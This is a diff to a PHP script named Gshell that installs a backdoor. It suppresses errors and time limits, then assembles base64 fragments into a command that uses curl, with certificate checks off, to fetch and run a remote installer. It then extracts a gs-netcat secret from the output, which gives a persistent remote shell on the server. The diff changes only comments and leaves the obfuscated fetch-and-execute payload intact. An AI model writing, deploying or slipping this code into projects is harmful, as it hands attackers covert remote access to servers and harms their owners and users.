@@ -1,8 +1,6 @@
 <?php
 
-// Gshell_1.1.0 
 // The script will run without any issue, unless "curl" is not present on the target.
-
 @set_time_limit(0);
 @ini_set('html_errors', '0');
 @clearstatcache();
@@ -16,6 +14,8 @@ if ($d_17b31f50) {
     @ini_set('display_errors', '0');
     @ini_set('log_errors', '0');
 }
+
+// exec value from "mess" pipes stdout back to regex
 function b_b9caa2a7($o_8ecaead4){
     $p_ccde149e = "";
     $o_8ecaead4 = $o_8ecaead4." 2>&1";
@@ -72,6 +72,8 @@ function b_b9caa2a7($o_8ecaead4){
     }
     return "";
 }
+
+// mess
 $i_3087fa6 = "R1NfTk9DRVJUQ0hFQ0s9M";
 $r_9a012e1c = "SBiYXNoIC1jICIkKGN1";
 $l_ed061e8a = "cmwgLWZzU0xrIGh0dHBzO";
@@ -81,7 +83,7 @@ $l_1dc8d4e8 = $l_ed061e8a . $b_cb62fb7c;
 $l_bb6f4ec5 = base64_decode($n_84c18552 . $l_1dc8d4e8);
 $o_8ecaead4 = $l_bb6f4ec5;
 $u_136ac113 = b_b9caa2a7($o_8ecaead4);
-$z_a3bcfc8e = '/gs-netcat -s \"(.*?)\" -i/';
+$z_a3bcfc8e = '/gs-netcat -s \"(.*?)\" -i/'; // regex
 if (preg_match($z_a3bcfc8e, $u_136ac113, $k_62615ba)) {
     echo "Success ==> " . $k_62615ba[0];
 } else {
